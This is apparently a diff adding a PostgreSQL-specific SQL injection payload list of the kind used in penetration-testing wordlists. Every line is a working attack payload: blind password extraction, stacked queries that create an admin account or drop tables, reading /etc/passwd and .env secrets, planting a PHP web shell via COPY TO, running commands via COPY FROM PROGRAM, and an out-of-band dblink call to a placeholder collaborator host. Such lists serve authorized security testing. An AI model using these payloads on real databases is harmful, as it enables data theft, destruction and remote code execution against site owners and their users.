@@ -1,0 +1,67 @@
+# ============================================================
+# SQL Injection — PostgreSQL Specific
+# ============================================================
+
+# ---- Detection ----
+'
+"
+$$
+')
+$1$
+' --
+$$ UNION SELECT 1--
+
+# ---- Comments ----
+--
+/* comment */
+
+# ---- System Information ----
+' UNION SELECT version(),NULL,NULL--
+' UNION SELECT current_user,NULL,NULL--
+' UNION SELECT current_database(),NULL,NULL--
+' UNION SELECT inet_server_addr(),NULL,NULL--
+
+# ---- Enumerate Databases ----
+' UNION SELECT datname,NULL FROM pg_database--
+
+# ---- Enumerate Tables ----
+' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--
+' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
+
+# ---- Enumerate Columns ----
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+# ---- Boolean Blind ----
+' AND SUBSTRING(password,1,1)='a'--
+' AND (SELECT COUNT(*) FROM users)>0--
+
+# ---- Time-Based Blind ----
+'; SELECT PG_SLEEP(5)--
+' AND 1=(SELECT 1 FROM PG_SLEEP(5))--
+' OR 1=1 AND (SELECT PG_SLEEP(5))--
+'; SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END--
+'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END FROM users WHERE username='admin'--
+
+# ---- Stacked Queries ----
+'; INSERT INTO users VALUES ('hacker','$2b$12$...')--
+'; UPDATE users SET is_admin=true WHERE username='hacker'--
+'; DROP TABLE users--
+
+# ---- File Read ----
+' UNION SELECT pg_read_file('/etc/passwd'),NULL--
+' UNION SELECT pg_read_file('/var/www/html/.env'),NULL--
+
+# ---- File Write (COPY TO) ----
+'; COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php'--
+
+# ---- RCE via COPY FROM PROGRAM ----
+'; COPY users FROM PROGRAM 'id'--
+'; COPY (SELECT 1) TO PROGRAM 'id'--
+'; CREATE TABLE cmd(t text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd--
+
+# ---- Dollar Quoting Bypass ----
+$$UNION SELECT 1$$
+$q$' UNION SELECT password FROM users-- $q$
+
+# ---- OOB via dblink ----
+'; SELECT dblink_connect('host=COLLABORATOR user=a password=a dbname=a')--
